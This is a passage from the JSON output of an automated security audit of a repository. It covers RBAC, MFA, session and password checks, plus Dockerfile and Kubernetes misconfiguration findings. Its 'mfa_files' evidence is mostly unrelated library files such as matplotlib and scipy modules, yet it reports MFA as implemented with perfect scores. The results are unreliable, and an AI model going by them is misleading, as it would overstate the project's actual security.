          "mcp_learning_system/servers/devops/automation/deployment_orchestrator.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/rich/progress.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/testing/fixtures/base.py",
          "test_env/lib/python3.12/site-packages/_pytest/runner.py",
          "test_env/lib/python3.12/site-packages/twisted/web/http.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/ssh/connection.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/typing_extensions.py",
          "code-base-crawler/code-base-crawler/comprehensive_test_suite.py",
          "code-base-crawler/code-base-crawler/anam_py/src/anam_py/kernels.py",
          "code-base-crawler/code-base-crawler/quick_validation.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/style.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/packages/six.py",
          "test_environments/chaos_engineering/resilience_validator.py",
          "test_env/lib/python3.12/site-packages/sqlalchemy/sql/elements.py",
          "test_env/lib/python3.12/site-packages/pydantic/aliases.py",
          "backup_agent3_20250607_010225/src/core/cache_config.py",
          "test_env/lib/python3.12/site-packages/zope/interface/common/tests/test_idatetime.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/rich/traceback.py",
          "test_environments/mcp_integration/distributed_loader.py",
          "test_env/lib/python3.12/site-packages/_pytest/stepwise.py",
          "test_environments/chaos_engineering/breaking_point_analyzer.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/linear_model/_base.py",
          "mcp_learning_system/python_learning/mcp_learning/core.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/rich/_ratio.py",
          "src/core/circuit_breaker_monitoring.py",
          "test_environments/load_generators/generators/network_load_generator.py",
          "test_environments/chaos_engineering/safety/safety_controller.py",
          "mcp_learning_system/python_learning/mcp_learning/orchestrator.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/_synctest.py",
          "mcp_learning_system/servers/quality/python_src/quality_learning.py",
          "src/utils/integration.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_agent.py",
          "src/auth/permissions.py",
          "test_env/lib/python3.12/site-packages/pypika_tortoise/__init__.py",
          "src/mcp/deployment/rollback_manager.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/joblib/externals/cloudpickle/cloudpickle.py",
          "test_rbac_standalone.py",
          "test_env/lib/python3.12/site-packages/anyio/_backends/_asyncio.py"
        ],
        "rbac_implemented": true,
        "security_score": 100
      },
      "session_security": {
        "session_security_features": {
          "secure_cookies": true,
          "httponly_cookies": true,
          "samesite_cookies": true,
          "session_regeneration": true,
          "session_timeout": true
        },
        "security_score": 100
      },
      "password_policies": {
        "password_security_score": 100,
        "strong_hashing_found": true,
        "hashing_algorithms": [
          "bcrypt",
          "bcrypt",
          "bcrypt",
          "bcrypt",
          "bcrypt",
          "scrypt",
          "argon2",
          "pbkdf2",
          "bcrypt",
          "bcrypt",
          "scrypt",
          "scrypt",
          "scrypt",
          "scrypt",
          "pbkdf2",
          "bcrypt",
          "scrypt",
          "pbkdf2",
          "argon2",
          "scrypt",
          "argon2",
          "pbkdf2",
          "bcrypt",
          "bcrypt",
          "scrypt",
          "scrypt",
          "bcrypt",
          "bcrypt",
          "scrypt",
          "pbkdf2",
          "bcrypt",
          "argon2",
          "pbkdf2",
          "pbkdf2",
          "bcrypt",
          "scrypt",
          "scrypt",
          "scrypt",
          "scrypt",
          "bcrypt",
          "pbkdf2",
          "pbkdf2",
          "bcrypt",
          "pbkdf2"
        ]
      },
      "multi_factor_auth": {
        "mfa_implemented": true,
        "mfa_files": [
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_endpoints.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/ensemble/_hist_gradient_boosting/gradient_boosting.py",
          "test_env/lib/python3.12/site-packages/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/O_S_2f_2.py",
          "src/auth/api.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pygments/unistring.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/_mathtext_data.py",
          "test_env/lib/python3.12/site-packages/emails/utils.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/signal/_signaltools.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/idna/idnadata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/widgets.py",
          "test_env/lib/python3.12/site-packages/aiohttp/_websocket/reader_py.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/idna/uts46data.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_stats_py.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/_odds_ratio.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "src/auth/audit.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbercomponent.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/idna/idnadata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/random_projection.py",
          "test_env/lib/python3.12/site-packages/twisted/web/_auth/wrapper.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/f2py/f90mod_rules.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/ticker.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/unicodedata/Blocks.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/idna/idnadata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/unicodedata/Mirrored.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_linprog.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/contourpy/chunk.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/dates.py",
          "test_environments/chaos_engineering/expert_chaos_controller.py",
          "test_env/lib/python3.12/site-packages/aiohttp/helpers.py",
          "agent4_comprehensive_security_audit.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/fftpack/_realtransforms.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
          "test_env/lib/python3.12/site-packages/aiohttp/_websocket/reader_c.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/reshape/merge.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_cocoa_builtins.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/_fitpack_repro.py",
          "test_env/lib/python3.12/site-packages/packaging/metadata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/ndimage/tests/test_interpolation.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_tcp.py",
          "tests/mcp_security_testing.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/texmanager.py",
          "test_env/lib/python3.12/site-packages/twisted/names/dns.py",
          "src/auth/user_manager.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/unicode.py",
          "test_env/lib/python3.12/site-packages/emails/compat/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_internal/metadata/_json.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/unicodedata/Scripts.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/apdlexer.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/asymmetric/rsa.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_bounce.py",
          "test_env/lib/python3.12/site-packages/requests/utils.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pygments/unistring.py",
          "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
          "test_env/lib/python3.12/site-packages/emails/store/file.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/tests/test_texmanager.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_internal/metadata/_json.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/linalg/_decomp_ldl.py",
          "test_env/lib/python3.12/site-packages/twisted/conch/test/test_conch.py",
          "rust_core/security_audit_env/mcp_learning_system/deployment/scripts/production_certification.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/unicode.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_internal/metadata/_json.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/perl.py",
          "test_env/lib/python3.12/site-packages/more_itertools/recipes.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/imap4.py",
          "test_circle_of_experts_local_validation.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/idna/uts46data.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/unicode.py",
          "rust_core/security_audit_env/mcp_learning_system/servers/quality/python_src/quality_learning.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/idna/uts46data.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pyparsing/unicode.py",
          "src/mcp/deployment/config_manager.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/pygments/unistring.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_pgf.py",
          "test_env/lib/python3.12/site-packages/idna/uts46data.py",
          "test_env/lib/python3.12/site-packages/twisted/internet/protocol.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/core/reshape/pivot.py",
          "test_env/lib/python3.12/site-packages/emails/backend/response.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_failure.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/component.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/packaging/metadata.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/f2py/f90mod_rules.py",
          "backup_agent3_20250607_010225/src/core/exceptions.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/spatial/distance.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/sklearn/decomposition/_dict_learning.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberxmlstream.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_add_newdocs.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/otConverters.py",
          "test_environments/circle_experts/experts/security_expert.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/unicode.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/backends/backend_ps.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/scripting.py",
          "src/utils/security.py",
          "test_environments/chaos_engineering/chaos_orchestrator.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/sasl.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_xmlstream.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/client.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/unistring.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/psutil/_pswindows.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/matplotlib/sphinxext/plot_directive.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pyparsing/unicode.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/_cred.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_randbytes.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/fixedTools.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/util/version/__init__.py",
          "test_env/lib/python3.12/site-packages/alembic/ddl/postgresql.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/__init__.py",
          "src/monitoring/observability_api.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/optimize/_basinhopping.py",
          "test_env/lib/python3.12/site-packages/twisted/application/_client_service.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabberclient.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/tests/io/test_sql.py",
          "test_env/lib/python3.12/site-packages/psutil/_pswindows.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/smtp.py",
          "test_env/lib/python3.12/site-packages/setuptools/config/_validate_pyproject/fastjsonschema_validations.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_http.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/xmlstream.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/models.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/misc/roundTools.py",
          "src/security/mcp_security_core.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_smtp.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/twofactor/hotp.py",
          "mcp_learning_system/deployment/scripts/production_certification.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/_core/tests/test_custom_dtypes.py",
          "test_rbac_direct.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ufoLib/__init__.py",
          "test_env/lib/python3.12/site-packages/twisted/trial/test/test_pyunitcompat.py",
          "test_env/lib/python3.12/site-packages/twisted/python/randbytes.py",
          "code-base-crawler/code-base-crawler/security_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/special/_basic.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
          "test_env/lib/python3.12/site-packages/twisted/mail/test/test_imap.py",
          "test_env/lib/python3.12/site-packages/markdown_it/_punycode.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/requests/utils.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_ident.py",
          "test_env/lib/python3.12/site-packages/twisted/web/test/test_web.py",
          "test_env/lib/python3.12/site-packages/twisted/words/protocols/jabber/ijabber.py",
          "test_environments/automation/pipelines/chaos_test_pipeline.py",
          "mcp_learning_system/python_learning/test_env/lib/python3.12/site-packages/pip/_vendor/pygments/unistring.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/urllib3/fields.py",
          "src/auth/models.py",
          "test_env/lib/python3.12/site-packages/twisted/protocols/ftp.py",
          "test_env/lib/python3.12/site-packages/pygments/lexers/_php_builtins.py",
          "src/mcp/connection_optimizer.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/stats/tests/test_stats.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/numpy/polynomial/polynomial.py",
          "src/mcp/security/scanner_server.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/idna/idnadata.py",
          "src/core/exceptions.py",
          "src/__init__.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pip/_vendor/idna/uts46data.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/_core/tests/test_custom_dtypes.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/serialization/pkcs7.py",
          "test_env/lib/python3.12/site-packages/twisted/words/xish/xmlstream.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ufoLib/validators.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/pandas/io/parsers/python_parser.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/idna/idnadata.py",
          "test_env/lib/python3.12/site-packages/setuptools/_vendor/packaging/metadata.py",
          "test_env/lib/python3.12/site-packages/httpx/_auth.py",
          "test_env/lib/python3.12/site-packages/twisted/python/test/test_syslog.py",
          "test_env/lib/python3.12/site-packages/cryptography/hazmat/primitives/twofactor/totp.py",
          "test_env/lib/python3.12/site-packages/pip/_internal/metadata/_json.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/numpy/polynomial/polynomial.py",
          "test_env/lib/python3.12/site-packages/idna/idnadata.py",
          "test_env/lib/python3.12/site-packages/pygments/unistring.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/interpolate/_interpolate.py",
          "test_env/lib/python3.12/site-packages/pip/_vendor/idna/uts46data.py",
          "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/scipy/integrate/_rules/_base.py",
          "test_environments/load_generators/generators/network_load_generator.py",
          "test_env/lib/python3.12/site-packages/zope/interface/tests/test_adapter.py",
          "code-base-crawler/code-base-crawler/anam_py/test_env/lib/python3.12/site-packages/pip/_internal/metadata/_json.py",
          "mcp_learning_system/servers/quality/python_src/quality_learning.py",
          "test_env/lib/python3.12/site-packages/twisted/words/test/test_jabbersasl.py",
          "test_env/lib/python3.12/site-packages/urllib3/fields.py",
          "test_rbac_standalone.py",
          "test_env/lib/python3.12/site-packages/twisted/test/test_ftp.py"
        ],
        "security_score": 100
      }
    },
    "infrastructure_security": {
      "dockerfile_security": {
        "dockerfiles_analyzed": 20,
        "total_issues": 5,
        "critical_issues": 0,
        "dockerfile_analysis": [
          {
            "file": "Dockerfile.rust-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.secure",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.python-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "Dockerfile.rust-build",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "mcp_learning_system/Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_learning_system/Dockerfile.learning-python",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_servers/Dockerfile.mcp-typescript",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "mcp_servers/Dockerfile.typescript-production",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/Dockerfile.simple",
            "issues": [
              {
                "line": 1,
                "issue": "Using latest tag",
                "severity": "MEDIUM",
                "recommendation": "Use specific version tags"
              },
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 2,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "code-base-crawler/code-base-crawler/tests/Dockerfile.test",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/docker/Dockerfile",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/test_results/integration_20250608_100235/Dockerfile",
            "issues": [
              {
                "line": 0,
                "issue": "No USER directive found",
                "severity": "HIGH",
                "recommendation": "Add USER directive to run as non-root"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 1
          },
          {
            "file": "mcp_learning_system/servers/Dockerfile.rust-server",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.rust-dev",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.mcp-server",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/development/Dockerfile.python-ml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.mcp-server-prod",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.rust-service",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "containers/production/Dockerfile.python-api",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          }
        ]
      },
      "kubernetes_security": {
        "k8s_files_analyzed": 58,
        "total_issues": 58,
        "critical_issues": 2,
        "k8s_analysis": [
          {
            "file": "k8s/security-context.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-hpa.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/security-policy.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-rbac.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/secrets.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/monitoring.yaml",
            "issues": [
              {
                "issue": "Host network access",
                "severity": "HIGH",
                "recommendation": "Remove hostNetwork: true"
              },
              {
                "issue": "Host PID/IPC access",
                "severity": "HIGH",
                "recommendation": "Remove hostPID/hostIPC: true"
              }
            ],
            "total_issues": 2,
            "critical_issues": 0,
            "high_issues": 2
          },
          {
            "file": "k8s/mcp-deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/network-policies.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-deployment.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/configmaps.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/pod-security-policies.yaml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              },
              {
                "issue": "Privilege escalation allowed",
                "severity": "HIGH",
                "recommendation": "Set allowPrivilegeEscalation: false"
              },
              {
                "issue": "Host network access",
                "severity": "HIGH",
                "recommendation": "Remove hostNetwork: true"
              },
              {
                "issue": "Host PID/IPC access",
                "severity": "HIGH",
                "recommendation": "Remove hostPID/hostIPC: true"
              },
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 5,
            "critical_issues": 1,
            "high_issues": 3
          },
          {
            "file": "k8s/rbac.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/mcp-monitoring.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "code-base-crawler/code-base-crawler/deploy/kubernetes/staging/deployment.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/deployments.yaml",
            "issues": [],
            "total_issues": 0,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/services.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/secrets.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/namespace.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "k8s/production/configmaps.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/deployments/mcp-production-deployment.yaml",
            "issues": [
              {
                "issue": "Privileged containers",
                "severity": "CRITICAL",
                "recommendation": "Remove privileged: true"
              },
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 2,
            "critical_issues": 1,
            "high_issues": 0
          },
          {
            "file": "deploy/health-checks/standard-checks.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/environments/development.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/environments/production.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/servers/brave-search.yaml",
            "issues": [
              {
                "issue": "Missing security context",
                "severity": "MEDIUM",
                "recommendation": "Add securityContext with appropriate settings"
              }
            ],
            "total_issues": 1,
            "critical_issues": 0,
            "high_issues": 0
          },
          {
            "file": "deploy/config/servers/security-scanner.yaml",
            "issues": [
              {
